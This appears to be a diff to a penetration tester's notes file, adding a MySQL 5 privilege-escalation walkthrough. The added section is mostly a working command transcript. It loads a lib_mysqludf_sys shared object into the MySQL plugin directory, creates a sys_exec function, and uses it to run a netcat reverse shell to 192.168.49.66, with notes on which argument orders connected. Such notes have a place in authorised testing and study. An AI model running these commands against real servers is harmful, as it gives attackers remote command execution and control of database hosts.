@@ -623,3 +623,46 @@ vrfy banzai
 ```
 PHP 5.* is on and CGI.bin is 200 we can shellshock
 ```
+# MYSQL version 5
+```bash
+It is vulnerable to raptor or another .so from rapid 7's Github.
+https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
+MYSQL does not have xp_cmdshell; But we can make one if it is vuln
+Pull the correct arch x86 or x64
+Set 777 perm
+mysql> SELECT VERSION();
+SELECT VERSION();
++-----------+
+| VERSION() |
++-----------+
+| 5.7.30    |
++-----------+
+1 row in set (0.00 sec)
+
+Pick a db
+mysql> use mysql                 
+use mysql
+
+mysql> create table bruiser(line blob);
+create table bruiser(line blob);
+Query OK, 0 rows affected (0.01 sec)
+
+mysql> insert into bruiser values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
+insert into bruiser values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
+Query OK, 1 row affected (0.00 sec)
+
+mysql> select * from bruiser into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
+select * from bruiser into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
+Query OK, 1 row affected (0.01 sec)
+
+mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
+create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> select sys_exec('nc 192.168.49.66 22 -e /bin/bash');
+select sys_exec('nc 192.168.49.66 22 -e /bin/bash');
+
+***Note: I was only able to get a connection with the above syntax. It needs to be in that order for it to connect.***
+***Note: /bin/sh works AND this did too... select sys_exec('nc -e /bin/bash 192.168.49.66 21');
+***UPDATE: You cant split the command -e in the front and /bin/sh at the back. Pick front load or backload.
+
